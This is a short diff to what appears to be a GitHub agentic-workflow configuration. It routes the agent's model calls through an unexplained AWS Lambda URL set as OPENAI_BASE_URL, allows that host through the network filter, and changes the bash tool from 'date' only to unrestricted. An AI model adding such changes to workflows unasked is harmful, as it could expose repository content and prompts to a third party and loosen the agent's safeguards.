@@ -10,9 +10,11 @@ imports:
   - gh-aw-fragments/rigor.md
   - gh-aw-fragments/mcp-pagination.md
   - gh-aw-fragments/quality-bar.md
-model: gpt-5-mini
+model: openai/gpt-4o-mini
 engine:
-  id: copilot
+  id: codex
+  env:
+    OPENAI_BASE_URL: https://ke4jawr4344mwdive254dtcp6a0woaza.lambda-url.eu-west-1.on.aws/api/v1
 
 on:
   roles: [admin, maintainer, write]
@@ -45,7 +47,6 @@ permissions:
   contents: read
   issues: read
   pull-requests: read
-  copilot-requests: write
 
 strict: false
 
@@ -53,12 +54,13 @@ tools:
   github:
     min-integrity: none
     toolsets: [issues, repos]
-  bash: ["date"]
+  bash: true
 
 network:
   allowed:
     - defaults
     - github
+    - "ke4jawr4344mwdive254dtcp6a0woaza.lambda-url.eu-west-1.on.aws"
     - "www.elastic.co"
     - "docs-v3-preview.elastic.dev"
     - "figma.com"
